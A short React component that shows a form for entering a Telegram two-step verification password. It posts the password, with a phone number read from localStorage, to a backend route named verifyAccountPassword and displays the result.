import { useState } from 'react';

export default function Password() {
    const [password, setPassword] = useState('');
    const [message, setMessage] = useState('');
    const [loading, setLoading] = useState(false);

    const phone = localStorage.getItem('telegram_phone');

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setMessage('');

        const res = await axios.post(route('verifyAccountPassword'), {
            phone,
            password,
        });

        if (res.data.message) {
            setMessage('✅ Login Successful!');
        } else {
            console.log(res.data);

            setMessage(res.data.error || 'Error occurred');
        }

        setLoading(false);
    };

    return (
        <div className="mx-auto mt-20 max-w-md rounded-lg bg-white p-6 shadow-lg">
            <h1 className="mb-4 text-xl font-bold">Enter 2FA Password</h1>
            <form onSubmit={handleSubmit}>
                <input
                    type="password"
                    placeholder="Telegram Password"
                    className="mb-4 w-full border p-2"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                />

                <button
                    disabled={loading}
                    className="w-full rounded bg-blue-600 px-4 py-2 text-white"
                >
                    {loading ? 'Verifying...' : 'Verify Password'}
                </button>
            </form>
            {message && <p className="mt-4 text-sm text-gray-700">{message}</p>}
        </div>
    );
}
